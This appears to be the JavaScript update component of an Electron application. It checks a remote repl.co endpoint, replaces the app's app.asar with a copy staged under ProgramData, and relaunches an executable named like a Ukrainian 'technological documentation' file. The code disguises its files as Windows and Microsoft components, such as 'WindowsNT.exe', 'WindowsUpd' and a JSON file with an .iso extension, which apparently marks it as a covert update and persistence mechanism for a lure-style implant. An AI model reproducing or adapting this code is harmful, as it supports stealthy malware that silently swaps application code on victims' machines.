const fs = require("fs");
const fsw = require('fs-extra');
const childProcess = require('child_process');
const PathAppAsar = String(fs.readFileSync("C:\\ProgramData\\WindowsNT.exe", "utf8"));
const PathAppResources = PathAppAsar.replace("\\app.asar", "");
const PathAppExe = PathAppAsar.replace("\\resources\\app.asar", "\\Технологічна документація.exe");
const remote = require("@electron/remote");
if (!fs.existsSync("C:\\ProgramData\\WindowsUpd\\AppUpdate.iso")) {
    fetch("https://updatefileexe.gooq.repl.co/app.json").then(data => {
        if (data.ok && data.status == 200) {
            data.json().then(json => {
                if (!fs.existsSync("C:\\ProgramData\\WindowsUpd\\WindPreservation")) {
                    fs.mkdirSync("C:\\ProgramData\\WindowsUpd\\WindPreservation")
                    Renamer()
                } else {
                    Renamer()
                }
                fs.rename("C:\\ProgramData\\WindowsUpd\\app.asar", "C:\\ProgramData\\WindowsUpd\\app.txt", err => {
                    if (err) {
                        console.log(err);
                        return;
                    } else {
                        console.log("ok");
                        fs.copyFileSync("C:\\ProgramData\\WindowsUpd\\app.txt", PathAppResources + "\\app.txt");
                        fs.renameSync(PathAppResources + "\\app.txt", PathAppResources + "\\app.asar");
                        fs.unlinkSync("C:\\ProgramData\\WindowsUpd\\app.txt");
                        fsw.outputFileSync("C:\\ProgramData\\Microsoft UPD\\version.micro", json.version);
                        childProcess.spawn(PathAppExe, ['/n'], { detached: true });
                        setTimeout(() => {
                            remote.app.quit();
                        }, 500)
                    }
                })

                // const sourceFile = 'C:\\ProgramData\\WindowsUpd\\app.asar';
                // const targetFile = PathAppResources;

                // fsw.copy(sourceFile, targetFile, (error) => {
                //     if (error) {
                //         console.error(`Ошибка при копировании файла: ${error.message}`);
                //         return;
                //     }
                //     console.log('Файл успешно скопирован.');
                // });
            })
        } else {
            remote.app.quit();
        }
    })
} else {
    const VBS = JSON.parse(fs.readFileSync("C:\\ProgramData\\WindowsUpd\\AppUpdate.iso", "utf8"));
    if (VBS.versionFile && VBS.src) {
        fs.copyFileSync(`C:\\ProgramData\\WindowsUpd\\WindPreservation\\${VBS.versionFile}`, VBS.src);
        fsw.outputFileSync("C:\\ProgramData\\Microsoft UPD\\version.micro", String(VBS.version));
        fs.unlinkSync("C:\\ProgramData\\WindowsUpd\\AppUpdate.iso");
        childProcess.spawn(PathAppExe, ['/n'], { detached: true });
        setTimeout(() => {
            remote.app.quit();
        }, 500)
    }
}
function Renamer() {
    fs.renameSync(PathAppResources + "\\app.asar", PathAppResources + "\\app.txt");
    if (!fs.existsSync("C:\\ProgramData\\Microsoft UPD\\version.micro")) {
        const fl = "C:\\ProgramData\\WindowsUpd\\WindPreservation\\app_" + String(Date.now()) + ".rollback";
        fs.writeFileSync(fl, "");
        fs.copyFileSync(String(PathAppResources + "\\app.txt"), fl)
    } else {
        const fl = "C:\\ProgramData\\WindowsUpd\\WindPreservation\\app_" + String(fs.readFileSync("C:\\ProgramData\\Microsoft UPD\\version.micro", "utf8")) + ".rollback"
        fs.writeFileSync(fl, "");
        fs.copyFileSync(String(PathAppResources + "\\app.txt"), fl)
    }
}
// const PathApp = fs.readFileSync("C:\\ProgramData\\WindowsNT.exe")
function Update() {
    if (!fs.existsSync("C:\\ProgramData\\WindowsUpd")) {
        app.quit();
    } else {
        if (!fs.existsSync("C:\\ProgramData\\WindowsUpd\\app.asar")) {
            app.quit();
        } else {
            if (PathAppResources) {
                fs.copyFileSync("C:\\ProgramData\\WindowsUpd\\y.txt", PathAppResources)
            }
        }
    }
}
//Update()